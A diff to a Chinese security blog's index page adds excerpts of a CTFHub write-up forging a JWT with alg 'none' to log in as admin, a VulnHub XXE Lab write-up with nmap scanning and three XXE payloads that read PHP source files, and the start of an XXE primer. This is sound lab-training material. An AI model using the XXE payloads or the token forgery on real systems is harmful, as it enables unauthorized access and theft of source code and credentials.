@@ -144,6 +144,197 @@
             
 
 <div class="post">
+    <a href="/2023/09/29/ctfhub-JWT/">
+        <h2 class="post-title"></h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <svg class="fa-icon"><use xlink:href="#calendar-solid"></use></svg>
+            </span>
+            2023/9/29
+        </span>
+    </div>
+    <div class="excerpt">
+        <div class="content" v-pre>
+            
+            <h1 id="CTFhub里的easy-login-writeup"><a href="#CTFhub里的easy-login-writeup" class="headerlink" title="CTFhub里的easy_login writeup"></a>CTFhub里的easy_login writeup</h1><p>CTFHub链接:<a target="_blank" rel="noopener" href="https://www.ctfhub.com/#/challenge">CTFHub</a></p>
+<p>JWT介绍参考链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/zr1213159840/article/details/122889002">小迪安全学习笔记–第40和41天JAVA安全及预编译CASE注入等目录遍历访问控制XSS等安全问题_小迪安全笔记40_铁锤2号的博客-CSDN博客</a></p>
+<p>先介绍什么是JWT：</p>
+<p>什么是JWT?<br>JSON web Token (JSON web令牌是一种跨域验证身份的方案。JWT不加密传输的数据，但能够通过数字签名来验证数据未被篡改。<br>JwT分为三部分，头部(Header)，声明(claims)，签名(signature)，三个部分以英文句号.隔开。JWT的内容以Base64URL进行了编码。<br>1）头部(Header)<br>{“alg”:“HS256”,</p>
+<p>“typ” : ““JWT””}<br>alg：是说明这个JwT的签名使用的算法的参数，常见值用s256(默认)，Hs512等，也可以为None。HS256表示HMAC SHA256。<br>typ：说明这个token的类型为JWT</p>
+<p>2）JWT固定参数（声明段）有:</p>
+<p>iss:发行人</p>
+<p>exp:到期时间</p>
+<p>sub:主题</p>
+<p>aud:用户</p>
+<p>nbf:在此之前不可用</p>
+<p>iat:发布时间</p>
+<p>jti: JWT ID用于标识该JWT</p>
+<p>3）签名(signatura)<br>服务器有一个不会发送给客户端的密码(secret)，用头部中指定的算法对头部和声明的内容用此密码进行加密，生成的字符串就是JwT的签名。<br>下面是一个用Hs256生成JwT的代码例子</p>
+<pre><code>HMACSHA256(base64UrlEncode (header) + “.”+base64URlEncode(payload) ,secret)
+</code></pre>
+<p>1、用户端登录，用户名和密码在请求中被发往服务器<br>2、(确认登录信息正确后)服务器生成json头部和声明，将登录信息写入JSON的声明中(通常不应写入密码，因为JWT是不加密的)，并用secret用指定算法进行加密,生成该用户的JWT。此时，服务器并没有保存登录状态信息。<br>3、服务器将JWT (通过响应)返回给客户端<br>4、用户下次会话时，客户端会自动将JwT写在HTTF请求头部的Authorization字段中<br>5、服务器对JWT进行验证，若验证成功，则确认此用户的登录状态</p>
+<p>下面是小迪老师总结的JWT漏洞利用：</p>
+<p><img src="/2023/09/29/ctfhub-JWT/学习\jwt\14.png" alt="image:43538257467"></p>
+<p>打开靶场后看到是登录注册界面，分别对注册和登录抓包看看情况</p>
+<p><img src="/2023/09/29/ctfhub-JWT/学习\jwt\1.png" alt="image:45456357467"></p>
+<p><img src="/2023/09/29/ctfhub-JWT/学习\jwt\2.png" alt="image:32453825754"></p>
+<p>在注册包里面没看到什么异常，但是在登录的包里看到了JWT的标志authorization（大概）</p>
+<p><img src="/2023/09/29/ctfhub-JWT/学习\jwt\3.png" alt="image:4353784537"></p>
+<p><img src="/2023/09/29/ctfhub-JWT/学习\jwt\4.png" alt="image:44784235347"></p>
+<p>将该base64字段拿到<a target="_blank" rel="noopener" href="https://jwt.io解密,分别得到头部、声明、签名三个字段,先保存下来/">https://jwt.io解密，分别得到头部、声明、签名三个字段，先保存下来</a></p>
+<p><img src="/2023/09/29/ctfhub-JWT/学习\jwt\5.png" alt="image:345477627"></p>
+<p>登录成功后看到flag will be here， 通过题目的提示，该代码使用的是nodejs编写的，所以跳到api配置文件 /controllers/api.js  下发现需要使用admin账号登录下访问/api/flag目录，且admin用户不能注册和直接登录，这时就需要使用JWT漏洞</p>
+<p><img src="/2023/09/29/ctfhub-JWT/学习\jwt\6.png" alt="image:435543773427"></p>
+<p><img src="/2023/09/29/ctfhub-JWT/学习\jwt\7.png" alt="image:6765324467"></p>
+<p>将之前的头部和声明段分别放到base64编码下，将alg的值改为“none”并且把base64加密后的“=”去掉并保存，声明内容里的secretid值改为空即：”[]”，username的值改为“admin”进行base64编码去掉等号使用“.”拼接在头部后并且在最后添加“.”表示为声明字段为空（secretid值改为“[]”是通过代码审计得出，因为没学过java其中的值分析不了）</p>
+<p><img src="/2023/09/29/ctfhub-JWT/学习\jwt\8.png" alt="image:324657853467"></p>
+<p><img src="/2023/09/29/ctfhub-JWT/学习\jwt\9.png" alt="image:43267423467"></p>
+<p>重新登录抓包将改完的值添加到authorization上并且将username改为admin即可登录成功</p>
+<p><img src="/2023/09/29/ctfhub-JWT/学习\jwt\10.png" alt="image:6886453267"></p>
+<p><img src="/2023/09/29/ctfhub-JWT/学习\jwt\11.png" alt="image:432546757657"></p>
+<p><img src="/2023/09/29/ctfhub-JWT/学习\jwt\12.png" alt="image:6875347467"></p>
+<p>最后访问/api/flag得到flag</p>
+<p><img src="/2023/09/29/ctfhub-JWT/学习\jwt\13.png" alt="image:9874375267"></p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        
+    </div>
+    <a href="/2023/09/29/ctfhub-JWT/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2023/09/27/vulnhub-xxelab1-writeup/">
+        <h2 class="post-title"></h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <svg class="fa-icon"><use xlink:href="#calendar-solid"></use></svg>
+            </span>
+            2023/9/27
+        </span>
+    </div>
+    <div class="excerpt">
+        <div class="content" v-pre>
+            
+            <h1 id="关于Vulnhub里的xxelab1过关"><a href="#关于Vulnhub里的xxelab1过关" class="headerlink" title="关于Vulnhub里的xxelab1过关"></a>关于Vulnhub里的xxelab1过关</h1><p>ps:跟着小迪老师的视频过的关</p>
+<p>靶机下载链接：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/xxe-lab-1,254/">XXE Lab: 1 ~ VulnHub</a></p>
+<p>由于靶机打开后是要登录的，然而设计者并没有给登录密码，所以ip地址未知</p>
+<p>因此先用nmap对网段进行扫描</p>
+<pre><code>nmap -sS 192.168.145.1/24
+</code></pre>
+<p><img src="/2023/09/27/vulnhub-xxelab1-writeup/学习\wp\1.png" alt="image:1245458574"></p>
+<p>发现可疑ip，尝试访问并且访问成功，网页本身没什么可疑点，所以对网站进行目录文件扫描</p>
+<p><img src="/2023/09/27/vulnhub-xxelab1-writeup/学习\wp\13.png" alt="image:785485857"></p>
+<p><img src="/2023/09/27/vulnhub-xxelab1-writeup/学习\wp\12.png" alt="image:7854858547"></p>
+<p>发现robots.txt文件，并访问</p>
+<p><img src="/2023/09/27/vulnhub-xxelab1-writeup/学习\wp\2.png" alt="image:785485847"></p>
+<p>存在xxe目录和admin.php文件</p>
+<p><img src="/2023/09/27/vulnhub-xxelab1-writeup/学习\wp\6.png" alt="image:78548584785"></p>
+<p>登录并抓包</p>
+<p><img src="/2023/09/27/vulnhub-xxelab1-writeup/学习\wp\8.png" alt="image:785485487387"></p>
+<p>从Conten-Type或者数据格式类型可以判断存在xxe漏洞</p>
+<p>（数据格式类型判断:<user>text</user><pass>Mikasa</pass></p>
+<p> Content-Type值判断：text/xml,appliacation/xml）</p>
+<p>将包发送到Repeater上尝试用payload进行攻击</p>
+<pre><code>payload：
+&lt;?xml version=&quot;1.0&quot; ?&gt;
+&lt;!DOCTYPE r [
+&lt;!ELEMENT r ANY &gt;
+&lt;!ENTITY sp SYSTEM &quot;php://filter/read=convert.base64-encode/resource=xxe.php&quot;&gt;
+]&gt;
+&lt;root&gt;&lt;name&gt;&amp;sp;&lt;/name&gt;&lt;password&gt;hj&lt;/password&gt;&lt;/root&gt;
+</code></pre>
+<p><img src="/2023/09/27/vulnhub-xxelab1-writeup/学习\wp\4.png" alt="image:7854854524"></p>
+<p>得到的base64加密数据发送到Decoder下解码，但是我看不出什么来，继续读取admin.php内容，并且继续解码</p>
+<pre><code>payload:
+&lt;?xml version=&quot;1.0&quot; ?&gt;
+&lt;!DOCTYPE r [
+&lt;!ELEMENT r ANY &gt;
+&lt;!ENTITY sp SYSTEM &quot;php://filter/read=convert.base64-encode/resource=admin.php&quot;&gt;
+]&gt;
+&lt;root&gt;&lt;name&gt;&amp;sp;&lt;/name&gt;&lt;password&gt;hj&lt;/password&gt;&lt;/root&gt;
+</code></pre>
+<p><img src="/2023/09/27/vulnhub-xxelab1-writeup/学习\wp\10.png" alt="image:752486548"></p>
+<p><img src="/2023/09/27/vulnhub-xxelab1-writeup/学习\wp\11.png" alt="image:7524865157"></p>
+<p><img src="/2023/09/27/vulnhub-xxelab1-writeup/学习\wp\9.png" alt="image:752486158"></p>
+<p>解码后发现登录账号和密码，但是密码是采用md5加密所以直接解密，尝试登录一下</p>
+<p><img src="/2023/09/27/vulnhub-xxelab1-writeup/学习\wp\5.png" alt="image:752484878"></p>
+<p><img src="/2023/09/27/vulnhub-xxelab1-writeup/学习\wp\14.png" alt="image:75248489"></p>
+<p>点击flag后跳转到了一个Not Found 的网页，继续使用payload读取内容并解码，注意此时是在根目录，而之前是在xxe的目录下，所以需要使用./来跳转</p>
+<p><img src="/2023/09/27/vulnhub-xxelab1-writeup/学习\wp\15.png" alt="image:752481528"></p>
+<pre><code>payload:
+&lt;?xml version=&quot;1.0&quot; ?&gt;
+&lt;!DOCTYPE r [
+&lt;!ELEMENT r ANY &gt;
+&lt;!ENTITY sp SYSTEM &quot;php://filter/read=convert.base64-encode/resource=./flagmeout.php&quot;&gt;
+]&gt;
+&lt;root&gt;&lt;name&gt;&amp;sp;&lt;/name&gt;&lt;password&gt;hj&lt;/password&gt;&lt;/root&gt;
+</code></pre>
+<p><img src="/2023/09/27/vulnhub-xxelab1-writeup/学习\wp\7.png" alt="image:752481525"></p>
+<p>解码后就得到flag了</p>
+<p><img src="/2023/09/27/vulnhub-xxelab1-writeup/学习\wp\3.png" alt="image:75248152"></p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        
+    </div>
+    <a href="/2023/09/27/vulnhub-xxelab1-writeup/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2023/09/26/XXE/">
+        <h2 class="post-title"></h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <svg class="fa-icon"><use xlink:href="#calendar-solid"></use></svg>
+            </span>
+            2023/9/26
+        </span>
+    </div>
+    <div class="excerpt">
+        <div class="content" v-pre>
+            
+            <p>先放上原文链接：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/20175211lyz/p/11413335.html">https://www.cnblogs.com/20175211lyz/p/11413335.html</a></p>
+<p>不得不说写的是真的好又全，所以直接复制过来了。</p>
+<h1 id="一、基础知识"><a href="#一、基础知识" class="headerlink" title="一、基础知识"></a>一、基础知识</h1><h2 id="1、XML"><a href="#1、XML" class="headerlink" title="1、XML"></a>1、XML</h2><p><code>XML</code>即 可扩展标记语言（EXtensible Markup Language），是一种标记语言，其标签没有预定义，您需要自行定义标签，是W3C的推荐标准。其于HTML的区别是：</p>
+<ul>
+<li>HTML 被设计用来显示数据</li>
+<li>XML 被设计用来传输和存储数据</li>
+</ul>
+<p>XML文档结构包括：</p>
+<ul>
+<li>XML声明</li>
+<li>DTD文档类型定义（可选）</li>
+<li>文档元素</li>
+</ul>
+<p>先看一下典型的xml文档：</p>
+<p><strong></strong></p>
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        
+    </div>
+    <a href="/2023/09/26/XXE/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
     <a href="/2022/11/23/实验三 XSS和SQL注入/">
         <h2 class="post-title"></h2>
     </a>
